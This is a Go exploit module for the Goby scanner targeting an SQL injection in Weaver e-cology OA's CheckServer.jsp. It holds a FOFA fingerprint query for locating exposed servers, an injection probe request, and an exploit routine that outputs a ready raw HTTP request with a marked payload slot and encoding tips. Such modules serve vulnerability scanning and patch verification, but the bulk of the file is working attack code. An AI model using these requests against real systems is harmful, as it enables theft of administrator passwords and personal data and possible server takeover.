package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver e-cology CheckServer.jsp file sql injection vulnerability",
    "Description": "<p>Weaver e-cology OA is a high-quality OA office system built on the principles of simplicity, applicability, and efficiency. The software is equipped with over 20 functional modules for processes, portals, knowledge, personnel, and communication, and adopts an intelligent voice interaction office mode. It can perfectly meet the actual needs of enterprises and provide them with full digital management.</p><p>Weaver e-cology OA has an SQL injection vulnerability, which allows attackers to not only obtain information from the database (such as administrator background passwords, user personal information of the site) through SQL injection vulnerabilities, but also write Trojan horses to the server under high privileges to further gain server system privileges.</p>",
    "Product": "Weaver-OA",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2023-04-20",
    "Author": "14m3ta7k",
    "FofaQuery": "((body=\"szFeatures\" && body=\"redirectUrl\") || (body=\"rndData\" && body=\"isdx\") || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\" || body=\"src=\\\"/js/jquery/jquery_wev8.js\" || (header=\"Server: WVS\" && (title!=\"404 Not Found\" && header!=\"404 Not Found\"))) && header!=\"testBanCookie\" && header!=\"Couchdb\" && header!=\"JoomlaWor\" && body!=\"<title>28ZE</title>\"",
    "GobyQuery": "((body=\"szFeatures\" && body=\"redirectUrl\") || (body=\"rndData\" && body=\"isdx\") || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\" || body=\"src=\\\"/js/jquery/jquery_wev8.js\" || (header=\"Server: WVS\" && (title!=\"404 Not Found\" && header!=\"404 Not Found\"))) && header!=\"testBanCookie\" && header!=\"Couchdb\" && header!=\"JoomlaWor\" && body!=\"<title>28ZE</title>\"",
    "Level": "3",
    "Impact": "<p>Weavere-cology OA has an SQL injection vulnerability, which allows attackers to not only obtain information from the database (such as administrator background passwords, user personal information of the site) through SQL injection vulnerabilities, but also write Trojan horses to the server under high privileges to further gain server system privileges.</p>",
    "Recommendation": "<p>The official security patch has been released for vulnerability repair: <a href=\"https://www.weaver.com.cn/cs/securityDownload.html\">https://www.weaver.com.cn/cs/securityDownload.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/mobile/plugin/CheckServer.jsp",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "219",
                    "Origin": "null",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "type=mobilesetting&settings=[{\"scope\":\"222\",\"modulename\":\"222%27222%27222\",\"module\":\"2\",\"setting\":\"test'test|1|2|,24|0#%E9%83%A8%E9%97%A8%E9%80%9A%E7%9F%A5|2|2|,25|0#%E4%B8%9A%E5%8A%A1%E5%85%AC%E5%91%8A|3|2|,62|0\"}]\""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "泛微 e-cology CheckServer.jsp 文件 SQL 注入漏洞",
            "Product": "泛微-协同办公OA",
            "Description": "<p>泛微OA办公系统也称为泛微协同办公系统，是一款以简单、适用、高效为原则打造的优质OA办公系统，该软件内置流程、门户、知识、人事、沟通的20多个功能模块，并采用智能语音交互办公模式，能够完美贴合企业实际需求，为企业打通全程数字化管理。</p><p>泛微OA办公系统存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>目前官方已发布安全补丁进行漏洞修复：<a href=\"https://www.weaver.com.cn/cs/securityDownload.html\" target=\"_blank\">https://www.weaver.com.cn/cs/securityDownload.html</a></p>",
            "Impact": "<p>泛微OA办公系统存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Weaver e-cology CheckServer.jsp file sql injection vulnerability",
            "Product": "Weaver-OA",
            "Description": "<p>Weaver e-cology OA is a high-quality OA office system built on the principles of simplicity, applicability, and efficiency. The software is equipped with over 20 functional modules for processes, portals, knowledge, personnel, and communication, and adopts an intelligent voice interaction office mode. It can perfectly meet the actual needs of enterprises and provide them with full digital management.</p><p>Weaver e-cology OA has an SQL injection vulnerability, which allows attackers to not only obtain information from the database (such as administrator background passwords, user personal information of the site) through SQL injection vulnerabilities, but also write Trojan horses to the server under high privileges to further gain server system privileges.</p>",
            "Recommendation": "<p>The official security patch has been released for vulnerability repair: <a href=\"https://www.weaver.com.cn/cs/securityDownload.html\" target=\"_blank\">https://www.weaver.com.cn/cs/securityDownload.html</a><br></p>",
            "Impact": "<p>Weavere-cology OA has an SQL injection vulnerability, which allows attackers to not only obtain information from the database (such as administrator background passwords, user personal information of the site) through SQL injection vulnerabilities, but also write Trojan horses to the server under high privileges to further gain server system privileges.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10785"
}`
	verifyPayloadU23890 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/mobile/plugin/CheckServer.jsp")
		cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0")
		cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
		cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
		cfg.Header.Store("Accept-Encoding", "gzip, deflate")
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Header.Store("Content-Length", "219")
		cfg.FollowRedirect = false
		cfg.Timeout = 12
		cfg.Header.Store("Origin", hostInfo.FixedHostInfo)
		cfg.Header.Store("Connection", "close")
		cfg.Header.Store("Upgrade-Insecure-Requests", "1")
		cfg.Data = `type=mobilesetting&settings=[{"scope":"222","modulename":"222%27222%27222","module":"2","setting":"test'test|1|2|,24|0#%E9%83%A8%E9%97%A8%E9%80%9A%E7%9F%A5|2|2|,25|0#%E4%B8%9A%E5%8A%A1%E5%85%AC%E5%91%8A|3|2|,62|0"}]"`
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		return resp, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := verifyPayloadU23890(hostInfo)
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && !strings.Contains(resp.Utf8Html, `您的请求`) && !strings.Contains(resp.Utf8Html, `非法`) && len(resp.Utf8Html) >= 2
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			resp, _ := verifyPayloadU23890(expResult.HostInfo)
			if resp.StatusCode == 200 && !strings.Contains(resp.Utf8Html, `您的请求`) && !strings.Contains(resp.Utf8Html, `非法`) && len(resp.Utf8Html) >= 2 {
				payload := "YourPayload"
				sqlPoint := fmt.Sprintf(`POST /mobile/plugin/CheckServer.jsp?type=mobileSetting HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36
Content-Type: multipart/form-data; boundary=7c9ad33d-3244-4e81-89cc-0036aa7dec66
Content-Length: 799
Host: %s
Connection: close
Accept-Encoding: gzip, deflate

--7c9ad33d-3244-4e81-89cc-0036aa7dec66
Content-Disposition: form-data; name="settings"

[{"scope":"1","module":"2","modulename":"ttt","setting":"@%s|1"}]
--7c9ad33d-3244-4e81-89cc-0036aa7dec66
Content-Disposition: form-data; name="timestamp"

__random__xvdas
--7c9ad33d-3244-4e81-89cc-0036aa7dec66--`, expResult.HostInfo.HostInfo, payload)
				expResult.Success = true
				expResult.Output = sqlPoint + "\n\n注：YourPayload字符串需要进行2次URL编码"
			}
			return expResult
		},
	))
}
